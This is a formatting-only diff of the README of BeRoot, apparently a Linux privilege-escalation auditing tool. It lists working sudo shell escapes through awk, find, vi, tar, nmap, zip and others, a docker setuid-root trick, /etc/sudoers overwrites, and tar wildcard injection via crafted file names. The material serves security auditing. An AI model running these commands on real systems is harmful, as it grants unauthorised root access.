@@ -12,58 +12,58 @@ LOLBins
 
 Here is a list of well-known binaries: 
 
-	* awk
+* awk
 ```
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
-	* docker (if you can call docker, no need to run it with sudo)
+* docker (if you can call docker, no need to run it with sudo)
 ```
 docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p
 ```
 
-	* find
+* find
 ```
 sudo find . -type d -exec sh -c id {} \;
 ```
 
-	* file viewer
+* file viewer
 ```
 less:	!bash
 man: 	!bash or $ sudo man -P whoami man
 more: 	!bash
 ```
 
-	* file modifications (cannot be consider as LOLbins but useful for privilege escalation)
+* file modifications (cannot be consider as LOLbins but useful for privilege escalation)
 ```
 cp:	sudo cp -f your_file /etc/sudoers
 mv:	sudo mv -f your_file /etc/sudoers
 ```
 
-	* ftp / sftp
+* ftp / sftp
 ```
 ftp> ! ls
 ```
 
-	* git
+* git
 ```
 export PAGER=./runme.sh
 sudo git -p help
 ```
 
-	* mount
+* mount
 ```
 sudo mount -o bind /bin/bash /bin/mount
 sudo mount
 ```
 
-	* nmap
+* nmap
 ```
 echo "os.execute('/bin/sh')" > /tmp/script.nse
 sudo nmap --script=/tmp/script.nse
 ```
 
-	* rsync
+* rsync
 ```
 echo "whoami > /tmp/whoami" > /tmp/tmpfile
 sudo rsync  -e 'sh /tmp/tmpfile' /dev/null 127.0.0.1:/dev/null 2>/dev/null
@@ -72,7 +72,7 @@ cat whoami
 root
 ```
 
-	* scripting languages
+* scripting languages
 ```
 lua: 	os.execute('/bin/sh')
 perl: 	sudo  perl -e 'exec "/bin/sh";'
@@ -80,18 +80,18 @@ python: sudo  python -c 'import os;os.system("/bin/sh")'
 ruby: 	sudo ruby -e 'exec "/bin/sh"'
 ```
 
-	* tar
+* tar
 ```
 sudo tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh
 ```
 
-	* text editor
+* text editor
 ```
 vi: 	sudo vi -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell
 vim : 	sudo vim -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell
 ```
 
-	* tcpdump
+* tcpdump
 ```
 echo "whoami > /tmp/whoami" > /tmp/tmpfile
 sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
@@ -100,12 +100,12 @@ cat whoami
 root
 ```
 
-	* wget (overwrite system file - need a web server)
+* wget (overwrite system file - need a web server)
 ```
 sudo wget http://127.0.0.1/sudoers -O /etc/sudoers
 ```
 
-	* zip
+* zip
 ```
 echo "/bin/sh" > /tmp/run.sh
 sudo zip z.zip * -T -TT /tmp/run.sh
@@ -135,11 +135,11 @@ user@host:~$ cat test.sh
 tar cf archive.tar * 
 ```
 Here are the steps to exploit this bad configuration: 
-	* open nano (with no arguments)
-	* write something in it
-	* save file using __tar__ arguments as file names: 
-		* --checkpoint-action=exec=sh
-		* --checkpoint=1
+* open nano (with no arguments)
+* write something in it
+* save file using __tar__ arguments as file names: 
+	* --checkpoint-action=exec=sh
+	* --checkpoint=1
 
 Once created, this is what you will find: 
 ```
@@ -187,9 +187,9 @@ Lots of file are run with high permissions on the system (e.g cron files, servic
 ```
 
 Here are the tests done by BeRoot: 
-	* checks if you have access with write permission on these files. 
-	* checks inside the file, to find other paths with write permissions. 
-	* checks for wildcards (this check could raise false positives, but could also get you useful information). Sometimes, you may need write permissions on a specific folder to create your malicious file (as explained on the wildcard section), this check is not done because it could be done by two many ways on the script and it's difficult to automate.
+* checks if you have access with write permission on these files. 
+* checks inside the file, to find other paths with write permissions. 
+* checks for wildcards (this check could raise false positives, but could also get you useful information). Sometimes, you may need write permissions on a specific folder to create your malicious file (as explained on the wildcard section), this check is not done because it could be done by two many ways on the script and it's difficult to automate.
 
 
 Suid binaries
@@ -205,7 +205,7 @@ BeRoot prints all suid files because a manually analyse should be done on each b
 Sudoers file
 ----
 
-Most of privilege escalations on Linux servers are done using bad sudo configurations. This configuration can be seen in __/etc/sudoers__ file. 
+Most of privilege escalations on Linux servers are done using bad sudo configurations. This configuration can be seen in __/etc/sudoers__ file. \
 To better understand the BeRoot workflow, you should have an idea on how a sudoers line is composed.  
 
 Basic line pattern: 
@@ -225,13 +225,13 @@ admin,user,root ALL = (ALL) NOPASSWD: /sbin/service, /usr/sbin/iptables, python 
 ```
 
 So BeRoot will analyse all rules: 
-	* if it affects our user or our user's group: 
-		* check if we have write permissions on all possible commands (in our example, it will test "service", "iptables", "python" and "/tmp/files.py")
-		* check for LOLBins
-		* check for LOLBins + wildcards 
-		* check if we can impersonate another user ("su" command)
-			* check write permissions on sensitive files and suid bin for this user
-			* realize again all these checks on the sudoers file using this new user
+* if it affects our user or our user's group: 
+	* check if we have write permissions on all possible commands (in our example, it will test "service", "iptables", "python" and "/tmp/files.py")
+	* check for LOLBins
+	* check for LOLBins + wildcards 
+	* check if we can impersonate another user ("su" command)
+		* check write permissions on sensitive files and suid bin for this user
+		* realize again all these checks on the sudoers file using this new user
 
 Exploit
 ----
